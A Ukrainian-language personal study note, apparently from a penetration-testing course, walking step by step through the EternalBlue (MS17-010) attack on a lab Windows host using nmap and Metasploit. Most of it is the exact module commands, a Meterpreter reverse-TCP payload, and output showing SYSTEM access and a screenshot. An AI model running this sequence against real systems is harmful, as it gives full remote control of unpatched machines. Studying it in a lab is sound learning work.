1  ----------
2 Звязки : [[приклади для злому цілі (3 приклади)]],[[атака SSH -(атака повним перебором) -приклади для злому цілі (приклад 5)]] , [[приклади для злому цілі (приклад 4)]] ,  [[Expoitation Challende ще 5 різних експлойтів]],
3 Теги : [[Eternal Blue Attack  (eternalblue)]]

запускаю [[сканування]] по ІР
sudo [[nmap]] -sS 192.168.1.77 

## Eternal Blue Attack  (eternalblue)

**eternalblue** експлошт вічний синій(екран)
атакують порти 445 і 139
- запускаю сканування по ІР
sudo nmap -sS 192.168.1.77 
- відкриваю ще один термінал в якому запускаю метасплоіт:
 msfconsole
 - щоб подивитися  чи вразлива машина до експлоіта **eternalblue**
search eternalblue
нас цікавить зараз :
exploit/windows/smb/ms17_010_eternalblue  

але перед цим просканую допоміжний модуль:
auxiliary/scanner/smb/smb_ms17_010  
use auxiliary/scanner/smb/smb_ms17_010 
а потім в модулі вже подивитися параметри :
show options
то побачу що потрібно настроїти RHOSTS
set RHOSTS 192.168.1.77
щоб почитати інформацію що робить модуль вводимо:
show info
можна запускати:
run
і ми бачимо що ціль уязвима:
 Auxiliary module execution completed
далі можна юзати сам експлоіт:
use exploit/windows/smb/ms17_010_eternalblue 
отримуємо корисну нагрузку :
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
і встановлюємо її:

 set payload windows/x64/meterpreter/reverse_tcp

далі по стандарту :
дивимось інформацію про екстлоіт
show info
дивимось опції 
show options
бачимо що не вистачає RHOSTS,  встановлюєм його :
set RHOSTS 192.168.1.77
і запускаєм:
run
оця їрунда означає успіх:
[+] 192.168.1.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
перевіряємо його(чи дійсно успіх):
вводимо команду (гет узер айді)
getuid
і отримуємо відповідь
Server username: NT AUTHORITY\система
NT AUTHORITY\система це обліковий  запис самого високого рівня на віндовс
якщо запустити команду справки 
help
то ми побачимо які команди нам доступні

для тесту наберу команду:
screenshot
 і вона буде збережена в /home/kali/AcinTcZt.jpeg

кіно тут:

ttps://www.youtube.com/watch?v=6lvoFQzRIAY&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=55